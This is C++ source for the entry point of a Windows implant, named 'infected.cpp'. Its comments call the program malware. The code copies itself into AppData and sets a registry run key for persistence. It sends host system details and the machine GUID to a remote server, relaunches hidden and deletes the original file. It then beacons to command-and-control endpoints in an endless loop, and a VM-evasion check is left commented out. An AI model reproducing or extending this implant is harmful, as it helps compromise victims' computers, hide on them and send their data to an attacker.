// infected.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "infected.h"
#include "SystemInfo.h"
#include "communication.h"
#include "utils.h"
#include "pers.h"

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    // check running in VM first!!!!
    /*if (IsRunningInVM()) {
        MessageBox(NULL, L"running in VM", L"alert", MB_OK);
        return 1;
    }*/
    InitCurDir();
    WCHAR encryptedMachineGuid[MAX_PATH] = { 0 };
    if (!GetEncryptedMachineGUID(encryptedMachineGuid, MAX_PATH)) {
        MessageBox(NULL, L"fail to get machine GUID", L"alert", MB_OK);
        return 1;
    }

    if (IsFirstTime()) {

        // copy to appdata
        WCHAR currentPath[MAX_PATH];
        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
        WCHAR newPath[MAX_PATH];
        CopyToAppData(currentPath, newPath);

        SetPersReg(newPath);

        SystemInfo sysInfo;
        SystemDetails details;
        sysInfo.GetSystemDetails(&details);

        char json[1024];
        JsonInfo(&details, json, sizeof(json));
        if (json[0] == '\0') {
            MessageBox(NULL, L"fail to convert systemdetail into json", L"alert", MB_OK);
            return 1;
        }

        swprintf(sysinfoPath, sizeof(sysinfoPath), L"/api/v1/sysinfo/%s", encryptedMachineGuid);

        if (SendJson(json, url, sysinfoPath)) {
            MessageBox(NULL, L"send success", L"alert", MB_OK);
        }
        else {
            MessageBox(NULL, L"send fail", L"alert", MB_OK);
        }

        // malware run in new path
        ShellExecuteW(NULL, L"open", newPath, NULL, NULL, SW_HIDE);
        // delete original file
        DeleteOrigin(currentPath);
        return 0;
    }
    else {
        MessageBox(NULL, L"this is not the first time", L"alert", MB_OK);
        char locationJson[MAX_PATH*2] = { 0 };
        char escapedCurDir[MAX_PATH] = { 0 };
        EscapeJsonString(currentDirectory, escapedCurDir, sizeof(escapedCurDir));
        swprintf(locationPath, sizeof(locationPath), L"/api/v1/locate/%s", encryptedMachineGuid);
        snprintf(locationJson, sizeof(locationJson), "{\
\"current_directory\":\"%s\" \
}", escapedCurDir);
        SendJson(locationJson, url, locationPath);
    }

    swprintf(beaconPath, sizeof(beaconPath), L"/api/v1/beacon/%s", encryptedMachineGuid);
    swprintf(resultPath, sizeof(resultPath), L"/api/v1/result/%s", encryptedMachineGuid);


    while (TRUE) {
        SendJson("{}", url, beaconPath, resultPath);
        // randomize time to send (5-30 minutes)
        //DWORD waitTime = GetRandomInterval(300, 1800);
        DWORD waitTime = GetRandomInterval(10, 60);
        Sleep(waitTime);  
    }

    return 0;
}